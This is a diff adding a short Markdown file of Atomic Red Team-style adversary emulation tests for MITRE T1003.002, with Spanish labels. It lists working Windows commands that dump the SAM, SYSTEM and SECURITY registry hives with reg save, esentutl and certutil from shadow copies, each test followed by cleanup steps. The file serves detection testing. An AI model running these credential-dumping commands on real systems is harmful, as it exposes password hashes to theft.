@@ -1,0 +1,36 @@
+################T1003.002.md################
+
+##Atomic Test #1 - Registry dump of SAM, creds, and secrets
+
+```md evidencia_T1003-002```
+```reg save HKLM\sam evidencia_T1003-002\sam```
+```reg save HKLM\system evidencia_T1003-002\system```
+```reg save HKLM\security evidencia_T1003-002\security```
+
+##Evidencia
+```dir evidencia_T1003-002\```
+
+#Borrado
+```rd /s /q evidencia_T1003-002```
+
+```PAUSE```
+
+##Atomic Test #3 - esentutl.exe SAM copy
+
+```esentutl.exe /y %SystemRoot%\system32\config\SAM /d %temp%\SAM```
+
+#Borrado
+```del %temp%\SAM```
+```PAUSE```
+
+##Atomic Test #5 - dump volume shadow copy hives with certutil
+
+```md evidencia_T1003-002```
+```for /L %a in (1,1,10) do @(certutil -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM" evidencia_T1003-002\SAMvss%a 2 >nul 2>&1) && dir /B evidencia_T1003-002\SAMvss%a```
+
+##Evidencia
+```dir evidencia_T1003-002\```
+
+#Borrado
+```for /L %a in (1,1,10) do @(del evidencia_T1003-002\SAMvss%a >nul 2>&1)```
+```PAUSE```
